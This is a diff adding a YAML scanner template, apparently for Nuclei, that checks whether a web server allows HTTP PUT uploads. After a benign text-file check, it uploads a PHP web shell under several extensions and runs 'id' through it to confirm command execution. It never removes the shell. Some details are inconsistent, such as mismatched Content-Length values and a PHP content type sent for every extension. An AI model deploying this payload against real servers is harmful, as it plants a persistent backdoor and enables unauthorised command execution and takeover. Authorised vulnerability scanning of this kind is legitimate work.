@@ -1,0 +1,105 @@
+id: advanced-put-method-enabled
+info:
+  author: 25
+  name: Advanced PUT Method Enabled Testing
+  severity: high
+outputs:
+- text: 'Vulnerable to PUT Method:
+
+    - Uploaded file: {{BaseURL}}/{{random-file}}
+
+    - Shell file: {{BaseURL}}/shell.{{extension}}
+
+    '
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - Hackedby25
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'PUT /{{random-file}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/plain
+
+    Content-Length: 10
+
+
+    Hackedby25
+
+    '
+  - 'GET /{{random-file}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - status:
+    - 200
+    - 204
+    type: status
+  matchers-condition: and
+  raw:
+  - 'DELETE /{{random-file}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <?php system($_GET['cmd']); ?>
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    extension:
+    - php
+    - jsp
+    - aspx
+    - html
+  raw:
+  - 'PUT /shell.{{extension}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-httpd-php
+
+    Content-Length: 50
+
+
+    <?php system($_GET[''cmd'']); ?>
+
+    '
+  - 'GET /shell.{{extension}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - part: body
+    regex:
+    - uid=[0-9a-zA-Z_()-. ]+ gid=[0-9a-zA-Z_()-. ]+
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'GET /shell.php?cmd=id HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+variables:
+  random-file: '{{randstr}}.txt'
+  risky-extensions:
+  - php
+  - jsp
+  - aspx
+  - html
